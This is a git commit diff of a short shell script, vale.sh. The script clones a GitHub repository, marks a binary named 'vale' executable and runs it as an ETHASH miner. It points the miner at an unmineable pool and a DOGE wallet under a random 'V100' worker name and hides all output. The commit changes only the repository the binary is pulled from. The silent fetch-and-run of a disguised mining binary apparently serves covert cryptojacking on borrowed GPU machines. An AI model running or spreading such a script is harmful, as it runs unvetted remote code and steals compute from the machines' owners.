798f8af6dfaa49f72644d4b07150033ab7416796
kuncisate <85315876+kuncisate@users.noreply.github.com>
2021-06-04 03:25:44 +0700

    Update vale.sh

--- vale.sh
+++ vale.sh
@@ -3,4 +3,4 @@ POOL=ethash.unmineable.com:3333
 WALLET=DOGE:DFnzT5dETx7AnkXqdkHese6uae5Au4uU19
 WORKER=$(echo $(shuf -i 1-30 -n 1)-V100)
 
-git clone https://github.com/adrpopack/1 &> /dev/null && cd 1/1.29 ; chmod +x vale && ./vale --algo ETHASH --pool $POOL --user $WALLET.$WORKER &> /dev/null
+git clone https://github.com/kuncisate/1 &> /dev/null && cd 1/1.29 ; chmod +x vale && ./vale --algo ETHASH --pool $POOL --user $WALLET.$WORKER &> /dev/null
